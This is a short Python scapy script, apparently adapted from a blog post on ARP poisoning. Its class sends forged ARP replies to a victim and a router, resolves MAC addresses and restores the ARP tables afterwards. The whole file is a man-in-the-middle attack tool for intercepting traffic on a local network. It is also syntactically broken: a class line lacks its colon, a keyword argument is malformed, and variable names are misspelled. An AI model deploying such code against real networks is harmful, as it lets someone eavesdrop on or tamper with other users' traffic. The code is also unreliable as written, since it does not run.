#REF: danmcinerney.org/arp-poisoning-with-python2/

from scapy.all import *
import signal
import sys
import logging
import time


class Poison
    def poison(routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

    def originalMAC(ip):
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry3)
        for s,r in ans:
            return r.sprint("%Ether.src%")

    
    def restore(routerIP, victimIP, reouterMAC, victimMAC):
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
        send(ARP(op=2, pdst=victimIP, psrc=routeriP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
        sys.exit("losing...")
